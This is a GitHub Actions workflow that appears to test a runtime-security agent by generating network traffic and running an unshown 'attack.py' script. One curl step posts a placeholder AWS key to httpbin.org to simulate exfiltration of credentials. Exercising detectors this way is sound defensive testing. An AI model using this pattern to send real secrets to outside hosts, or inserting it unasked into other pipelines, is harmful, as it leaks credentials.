name: Test ROC Agent (Docker) lol

on:
  workflow_dispatch:

jobs:
  test-roc-agent:
    runs-on: ubuntu-latest
    permissions:
      contents: write

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Start ROC Agent (Docker)
        id: roc-start
        uses: o3security/roc-agent@v0.0.2
        with:
          server_url: https://api.codexsecurity.io/graphql
          api_key: ${{ secrets.ROC_API_KEY }}
          project_name: ${{ github.repository }}
          print_only: false
          debug: true
          docker_image: hanshal785/tringg:1
          runtime_security: true

      - name: Setup Go
        uses: actions/setup-go@v5
        with:
          go-version: "1.22"

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"

      - name: Simulate Network Traffic
        run: |
          echo "ROC process started with PID: ${{ steps.roc-start.outputs.roc_pid }}"
          echo "Waiting for ROC to initialize..."
          sleep 10

          echo "=============================="
          echo "Running Go test..."
          echo "=============================="
          if [ -f "nw.go" ]; then
            go run nw.go
          else
            echo "nw.go not found"
          fi

          sleep 5

          echo "=============================="
          echo "Running Python test..."
          echo "=============================="
          if [ -f "nw.py" ]; then
            python3 nw.py
          else
            echo "nw.py not found"
          fi

          sleep 5

          echo "=============================="
          echo "Running Node.js test..."
          echo "=============================="
          if [ -f "nw.js" ]; then
            node nw.js
          else
            echo "nw.js not found"
          fi

          sleep 5

          echo "=============================="
          echo "Generating curl traffic..."
          echo "=============================="

          curl -X POST https://httpbin.org/post \
            -H "Content-Type: application/json" \
            -d '{"aws_key":"test_AKIA1234567890ABCDEF"}'

          curl -L -s google.com

          echo "Waiting for ROC to capture..."
          sleep 10
          echo "Running Runtime Securirty Path"
          python3 attack.py
          echo "Runtime attack completed"

      - name: Save Docker Logs to docker.log
        run: |
          echo "Fetching docker logs..."
          CONTAINER_ID=$(sudo docker ps -aq --filter "ancestor=hanshal785/roc-mainin:1" | head -1)
          if [ -n "$CONTAINER_ID" ]; then
            echo "Found container: $CONTAINER_ID"
            sudo docker logs "$CONTAINER_ID" > docker.log 2>&1
          else
            echo "No container found" > docker.log
          fi
          ls -lh docker.log
          tail -100 docker.log


      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: logs-${{ github.run_number }}
          name: ROC Logs Run ${{ github.run_number }}
          files: docker.log
          generate_release_notes: true

      - name: Cleanup
        run: |
          echo "ROC cleanup will run automatically"
